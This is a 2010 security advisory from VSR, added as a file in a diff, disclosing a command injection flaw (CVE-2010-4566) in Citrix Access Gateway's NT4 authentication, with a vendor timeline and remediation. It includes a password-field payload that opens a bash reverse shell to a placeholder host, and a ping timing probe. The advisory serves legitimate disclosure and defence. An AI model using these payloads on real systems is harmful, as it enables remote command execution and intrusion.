@@ -1,0 +1,161 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+
+                         VSR Security Advisory
+                       http://www.vsecurity.com/
+
+- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+Advisory Name: Citrix Access Gateway Command Injection Vulnerability
+ Release Date: 2010-12-21
+  Application: Citrix Access Gateway
+     Versions: Access Gateway Enterprise Edition (up to 9.2-49.8)
+	       Access Gateway Standard & Advanced Edition (prior to 5.0)
+     Severity: High
+       Author: George D. Gal <ggal (at) vsecurity (dot) com>
+Vendor Status: Updated Software Released, NT4 Authentication Removed [2]
+CVE Candidate: CVE-2010-4566
+    Reference: http://www.vsecurity.com/resources/advisory/20101221-1/
+
+- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+
+Product Description
+- -------------------
+- From [1]:
+
+ "Citrix(R) Access Gateway(TM) is a secure application access solution that
+  provides administrators granular application-level control while
+  empowering users with remote access from anywhere. It gives IT
+  administrators a single point to manage access control and limit actions
+  within sessions based on both user identity and the endpoint device,
+  providing better application security, data protection, and compliance
+  management."
+
+Vulnerability Overview
+- ----------------------
+
+On August 2nd, VSR identified a vulnerability in Citrix Access Gateway within
+the way user authentication credentials are handled.  Under certain
+configuration settings it appears that user credentials are passed as
+arguments to a command line program to authenticate the user. A lack of data
+validation and the mechanism in which the external program is spawned results
+in the potential for command injection and arbitrary command execution on the
+Access Gateway.
+
+Vulnerability Details
+- ---------------------
+
+The Citrix Access Gateway provides support for multiple authentication types.
+When utilizing the external legacy NTLM authentication module known as
+ntlm_authenticator the Access Gateway spawns the Samba 'samedit' command
+line utility to verify a user's identity and password.  By embedding shell
+metacharacters in the web authentication form it is possible to execute
+arbitrary commands on the Access Gateway.
+
+The following commands are executed by the ntlm_authenticator during this
+process:
+
+ vpnadmin 10130  0.0  0.0  2104  976 ?        S    15:02   0:00 sh -c /usr/local/samba/bin/samedit -c 'samuser username -a' -U <<username>>%<<password>> -p 139 -S xxx.xxx.xxx.xxx > /tmp/samedit-samuser-stdout.50474096 2> /dev/null
+
+vpnadmin 10131  0.0  0.1  3852 1528 ?        S    15:02   0:00 /usr/local/samba/bin/samedit -c samuser username -a -U <<username>>%XXXXXXXX -p 139 -S xxx.xxx.xxx.xxx
+
+By submitting a password value as shown below, it is possible to establish a
+reverse shell to a netcat listener:
+
+ | bash -i >& /dev/tcp/<<HOST>>/<<PORT>> 0>&1 &
+
+Using a simple ping command in the password field an attacker could use timing
+attacks to verify the presence of the vulnerability:
+
+ | ping -c 10 <<HOST>>
+
+The ping command above will attempt to send 10 ICMP echo requests to the
+target host, resulting in a noticable delay easily detected by vulnerability
+scanners.
+
+Versions Affected
+- -----------------
+Testing was performed against a Citrix Access Gateway 2000 version 4.5.7.
+According to the vendor this vulnerability affects all versions of Access
+Gateway Enterprise Edition up to version 9.2-49.8, and all versions of
+the Access Gateway Standard and Advanced Editions prior to Access Gateway
+5.0.
+
+Vendor Response
+- ---------------
+The following timeline details the vendor's response to the reported issue:
+
+2010-08-06    Citrix was provided a draft advisory.
+2010-08-10    Citrix acknowledged receipt of draft advisory.
+2010-08-16    VSR follow-up to determine confirmation of issue.
+2010-08-16    Citrix confirmed issue.
+2010-09-14    VSR follow-up to determine status of issue.
+2010-09-29    VSR follow-up to determine status of issue.
+2010-09-30    Citrix confirmed continued investigation of the issue.
+2010-10-19    VSR follow-up to determine status of issue.
+2010-10-26    Citrix verified issue only exists in NT4 authentication feature.
+2010-12-01    VSR follow-up to determine status of issue.
+2010-12-02    Citrix confirmed December 14th release of security bulletin.
+2010-12-14    Citrix releases security bulletin.
+2010-12-20    CVE assigned
+2010-12-21    VSR releases advisory.
+
+
+The Citrix advisory may be obtained at:
+  http://support.citrix.com/article/CTX127613
+
+Recommendation
+- --------------
+Citrix has indicated that this vulnerability only affects legacy NT4
+authentication which has been removed from the latest release of the
+device firmware.
+
+Common Vulnerabilities and Exposures (CVE) Information
+- ------------------------------------------------------
+The Common Vulnerabilities and Exposures (CVE) project has assigned
+the number CVE-2010-4566 to this issue.  This is a candidate for
+inclusion in the CVE list (http://cve.mitre.org), which standardizes
+names for security problems.
+
+
+Acknowledgements
+- ----------------
+VSR would like to thank Citrix for the coordinated release of this advisory.
+
+- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+References:
+
+1. Citrix Access Gateway
+   http://citrix.com/accessgateway/overview
+2. Citrix Access Gateway - Vendor Security Bulletin
+   http://support.citrix.com/article/CTX127613
+
+- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+This advisory is distributed for educational purposes only with the sincere
+hope that it will help promote public safety.  This advisory comes with
+absolutely NO WARRANTY; not even the implied warranty of merchantability or
+fitness for a particular purpose.  Virtual Security Research, LLC nor the
+author accepts any liability for any direct, indirect, or consequential loss
+or damage arising from use of, or reliance on, this information.
+
+See the VSR disclosure policy for more information on our responsible
+disclosure practices:
+
+  http://www.vsecurity.com/company/disclosure
+
+- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+     Copyright 2010 Virtual Security Research, LLC.  All rights reserved.
+
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.8 (Darwin)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
+
+iEYEARECAAYFAk0Q3L8ACgkQQ1RSUNR+T+idEwCeN2plOLk8rWQoPY4DqAolEY5V
+EbEAoJn38LPt3MEm3xvQaL6wWPbwDsUb
+=b3y+
+-----END PGP SIGNATURE-----
